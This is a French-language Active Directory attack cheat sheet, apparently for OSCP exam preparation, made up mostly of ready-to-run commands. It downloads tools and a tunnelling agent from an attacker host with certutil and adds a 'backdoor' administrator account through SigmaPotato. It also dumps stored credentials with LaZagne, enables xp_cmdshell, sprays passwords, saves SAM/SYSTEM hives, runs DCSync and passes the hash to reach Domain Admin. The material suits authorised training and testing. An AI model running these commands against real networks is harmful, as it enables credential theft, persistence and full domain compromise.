# Active Directory Methodology

## Phase 1 : Initial Foothold (Machine #1 — WS/Client)

### Valider les Credentials

```shell
# Check WinRM
nxc winrm $target -u 'user' -p 'password' --continue-on-success

# Check RDP
nxc rdp $target -u 'user' -p 'password' --continue-on-success

# Check SMB
nxc smb $target -u 'user' -p 'password' --continue-on-success
```

### Se Connecter

```shell
# Option 1 : Evil-WinRM (préféré)
evil-winrm -i $target -u 'user' -p 'password'

# Option 2 : RDP avec partage de drive
xfreerdp3 /cert-ignore /u:'user' /p:'password' /v:$target /drive:/var/www/html
```

### Transférer les Outils & Énumérer

```powershell
# Download des outils
certutil -urlcache -f http://$lhost/winpeas64.exe winpeas64.exe
certutil -urlcache -f http://$lhost/SharpHound.ps1 SharpHound.ps1
certutil -urlcache -f http://$lhost/PrivescCheck.ps1 PrivescCheck.ps1

# Run WinPEAS
.\winpeas64.exe

# Run PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### BloodHound Collection

```powershell
powershell -ep bypass
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix "AD"

# Download le zip pour analyse
download C:\Users\Public\AD_*.zip
```

### Analyser BloodHound

Chercher :

- **Shortest path to Domain Admins**
- **Users with DCSync rights**
- **Kerberoastable users**
- **ASREPRoastable users**
- **ACL abuse paths** (AllExtendedRights, GenericAll, WriteDacl)
- **GPO abuse paths**

---

## Phase 2 : Privilege Escalation (Machine #1)

### Vérifier les Privileges

```powershell
whoami /priv
whoami /groups
```

### Chemins Courants

| Finding | Attaque |
| :--- | :--- |
| SeImpersonatePrivilege | SigmaPotato / GodPotato |
| SeBackupPrivilege | Dump SAM/SYSTEM |
| AutoLogon credentials dans le registre | WinPEAS trouve automatiquement |
| Saved credentials | `cmdkey /list` + RunAs |
| Unquoted service path | Service hijacking |
| DLL Hijacking | Remplacer la DLL vulnérable |
| AllExtendedRights sur user | Reset password |
| Stored credentials | LaZagne |

### SigmaPotato (SeImpersonatePrivilege)

```powershell
.\SigmaPotato.exe "net user backdoor Password123! /add"
.\SigmaPotato.exe "net localgroup Administrators backdoor /add"
```

### LaZagne

```cmd
.\laZagne.exe all -quiet
```

### AllExtendedRights Abuse

```shell
# Depuis Kali — Reset le mot de passe de l'utilisateur cible
net rpc password "target_user" 'NewPass123!' -U "domain/current_user%password" -S $dc_ip

# Vérifier les nouveaux credentials
nxc winrm $target -u 'target_user' -p 'NewPass123!' -d domain
```

---

## Phase 3 : Pivoting (Ligolo-ng)

> Requis pour atteindre les machines internes (Machine #2, DC).

### Setup Ligolo-ng

```shell
# Sur Kali (démarrer le proxy)
./proxy -selfcert

# Ajouter la route pour le réseau interne
sudo ip route add 172.16.x.0/24 dev ligolo
```

```powershell
# Sur la cible (exécuter l'agent)
certutil -urlcache -f http://$lhost/agent.exe agent.exe
.\agent.exe -connect $lhost:11601 -ignore-cert
```

```shell
# Dans la console Ligolo
session     # Sélectionner la session
ifconfig    # Voir les IPs internes
start       # Démarrer le tunnel
```

### Port Forwarding avec Ligolo

```shell
# Forward d'un port local vers un service interne
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
```

---

## Phase 4 : Lateral Movement (Machine #2 — SRV)

### Énumérer le Réseau Interne

```shell
# Scanner les hôtes internes via le tunnel
nmap -T4 -p- -Pn 172.16.x.202

# Vérifier l'accès avec les credentials actuels
nxc smb 172.16.x.0/24 -u 'user' -p 'password' --continue-on-success
nxc winrm 172.16.x.0/24 -u 'user' -p 'password' --continue-on-success
```

### Trouver Plus de Credentials

Chercher sur la machine compromise :

- **PowerShell history** : `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- **Registry AutoLogon** : `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- **Saved RDP connections** : `HKCU\Software\Microsoft\Terminal Server Client\Servers`
- **MSSQL credentials** : Si SQL Server tourne, se connecter et chercher une table creds

### MSSQL Exploitation

```shell
# Si port 1433 trouvé — forwarder via Ligolo si nécessaire
impacket-mssqlclient 'user'@127.0.0.1 -windows-auth

# Énumérer
SQL> SELECT name FROM sys.databases;
SQL> use accounts;
SQL> SELECT * FROM creds;

# Activer xp_cmdshell pour RCE
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

### Credential Spraying

```shell
# Combiner users et passwords trouvés
nxc winrm 172.16.x.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

---

## Phase 5 : Domain Controller (Machine #3 — DC)

### Vérifier l'Accès au DC

```shell
nxc smb $dc_ip -u 'user' -p 'password' -d domain
nxc winrm $dc_ip -u 'user' -p 'password' -d domain
```

### SeBackupPrivilege Abuse (si présent)

```powershell
# Vérifier les privileges
whoami /priv

# Si SeBackupPrivilege activé
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
download SAM
download SYSTEM

# Extraire les hashes sur Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### DCSync (si les droits existent)

```shell
# DCSync complet
impacket-secretsdump domain/user:password@$dc_ip

# Extraire un utilisateur spécifique
impacket-secretsdump -just-dc-user Administrator domain/user:password@$dc_ip
```

### Pass the Hash

```shell
# Avec le hash NTLM extrait
evil-winrm -i $dc_ip -u 'Administrator' -H 'HASH'
impacket-psexec domain/Administrator@$dc_ip -hashes :HASH
```

---

## Phase 6 : Post-Exploitation DC

```powershell
# Toujours capturer les deux dans le même screenshot !
type C:\Users\Administrator\Desktop\proof.txt
hostname
ipconfig
```

```shell
# Full domain dump optionnel
impacket-secretsdump domain/Administrator@$dc_ip -just-dc
```

---

## Flowchart AD

```text
┌─────────────────────────────────────────────────────────────────┐
│                    OSCP AD SET METHODOLOGY                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐    Validate     ┌──────────────┐              │
│  │  Start with  │───────────────▶│   Machine #1  │              │
│  │  Credentials │   WinRM/RDP     │   (WS/Client) │              │
│  └──────────────┘                 └───────┬──────┘              │
│                                           │                      │
│                         BloodHound + WinPEAS + PrivescCheck      │
│                                           ▼                      │
│  ┌────────────────────────────────────────────────────────┐     │
│  │  Look For:                                              │     │
│  │  • SeImpersonatePrivilege → SigmaPotato                │     │
│  │  • SeBackupPrivilege → SAM/SYSTEM dump                 │     │
│  │  • Registry AutoLogon → New creds                      │     │
│  │  • AllExtendedRights → Password reset                  │     │
│  │  • Saved creds → LaZagne                               │     │
│  │  • PowerShell history → Leaked passwords               │     │
│  └────────────────────────────────────────────────────────┘     │
│                                           │                      │
│                                   PrivEsc + Pivot                │
│                                    (Ligolo-ng)                   │
│                                           ▼                      │
│  ┌──────────────┐   Spray creds   ┌──────────────┐              │
│  │  Machine #2  │◀────────────────│   Internal   │              │
│  │  (SRV/Member)│   or new creds  │   Network    │              │
│  └───────┬──────┘                 └──────────────┘              │
│          │                                                       │
│  • Check MSSQL → Query for creds                                │
│  • Check shares → Sensitive files                               │
│  • Check history → PowerShell history                           │
│          │                                                       │
│          ▼                                                       │
│  ┌──────────────┐                                               │
│  │  Machine #3  │  ← SeBackupPrivilege + SAM dump               │
│  │  (DC)        │  ← DCSync si droits suffisants                 │
│  └───────┬──────┘  ← Pass-the-Hash avec NTLM Admin              │
│          │                                                       │
│          ▼                                                       │
│  ┌──────────────┐                                               │
│  │   DOMAIN     │  proof.txt + hostname + ipconfig              │
│  │   ADMIN!     │                                               │
│  └──────────────┘                                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Kill Chains AD

### Chain 1 : ACL Abuse

```text
User A (credentials fournis)
    │
    ├─► BloodHound trouve AllExtendedRights sur User B
    │
    ├─► Reset mot de passe de User B
    │
    ├─► User B a GenericAll sur User C (Admin)
    │
    └─► Reset mot de passe de User C → accès Admin
```

### Chain 2 : Credential Hopping

```text
User A (credentials fournis)
    │
    ├─► WinPEAS trouve credentials AutoLogon → User B
    │
    ├─► User B accède à Machine #2
    │
    ├─► MSSQL sur Machine #2 contient creds → User C
    │
    ├─► User C a SeBackupPrivilege sur le DC
    │
    └─► Dump SAM → hash Admin → PTH vers le DC
```

### Chain 3 : Service Abuse

```text
User A (credentials fournis)
    │
    ├─► SeImpersonatePrivilege → SigmaPotato → Local Admin
    │
    ├─► Extraire creds en cache avec mimikatz → User B
    │
    ├─► User B membre de "SQL Admins" → accès MSSQL
    │
    ├─► xp_cmdshell sur Machine #2 → Shell
    │
    └─► Machine #2 a DCSync rights → Domain Admin
```

### Chain 4 : GPO Abuse

```text
User A (credentials fournis)
    │
    ├─► BloodHound trouve accès en écriture sur GPO
    │
    ├─► SharpGPOAbuse → Ajouter User A aux Admins locaux
    │
    ├─► gpupdate /force
    │
    └─► Admin sur toutes les machines affectées par la GPO
```

---

## Quick Reference

### Credential Validation

```shell
nxc smb $target -u 'user' -p 'pass'          # SMB check
nxc winrm $target -u 'user' -p 'pass'        # WinRM check
nxc rdp $target -u 'user' -p 'pass'          # RDP check
nxc smb $target -u 'user' -H 'HASH'          # Pass-the-hash
```

### Shell Access

```shell
evil-winrm -i $target -u 'user' -p 'pass'       # WinRM shell
evil-winrm -i $target -u 'user' -H 'HASH'       # PTH shell
impacket-psexec domain/user:pass@$target        # PsExec shell
impacket-wmiexec domain/user:pass@$target       # WMI shell
```

### Credential Extraction

```shell
impacket-secretsdump domain/user:pass@$target               # Remote dump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL          # Local dump
impacket-secretsdump -ntds ntds.dit -system system LOCAL    # NTDS dump
```

### Kerberos Attacks

```shell
# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip $target -request

# AS-REP Roasting
impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat
```

### Password Cracking

```shell
hashcat -m 13100 hashes /path/to/wordlist    # Kerberoast
hashcat -m 18200 hashes /path/to/wordlist    # AS-REP
hashcat -m 1000 hashes /path/to/wordlist     # NTLM
hashcat -m 5600 hashes /path/to/wordlist     # NetNTLMv2
```

### LDAP Enumeration

```shell
# Null bind
ldapsearch -h $rhost -x -b "DC=domain,DC=local"

# Zone transfer DNS
dig @$rhost axfr
dig -x $rhost
```
